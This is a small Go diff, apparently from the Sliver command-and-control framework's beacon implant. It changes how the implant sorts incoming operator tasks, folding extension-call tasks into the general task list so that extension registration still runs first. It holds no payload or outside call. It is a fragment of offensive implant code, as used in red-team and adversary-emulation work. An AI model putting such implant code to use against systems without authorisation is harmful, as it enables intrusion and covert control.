@@ -395,26 +395,20 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	}
 
 	var tasksExtensionRegister []*sliverpb.Envelope
-	var tasksExtensionCall []*sliverpb.Envelope
 	var tasksOther []*sliverpb.Envelope
 
 	for _, task := range tasks.Tasks {
 		switch task.Type {
 		case sliverpb.MsgRegisterExtensionReq:
 			tasksExtensionRegister = append(tasksExtensionRegister, task)
-		case sliverpb.MsgCallExtensionReq:
-			tasksExtensionCall = append(tasksExtensionCall, task)
 		default:
 			tasksOther = append(tasksOther, task)
 		}
 	}
 
-	// execute task lists sequentially, ensure all extensions are registered before they are called
+	// ensure extensions are registered before they are called
 	var results []*sliverpb.Envelope
 	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
-		results = append(results, r)
-	}
-	for _, r := range beaconHandleTasklist(tasksExtensionCall) {
 		results = append(results, r)
 	}
 	for _, r := range beaconHandleTasklist(tasksOther) {
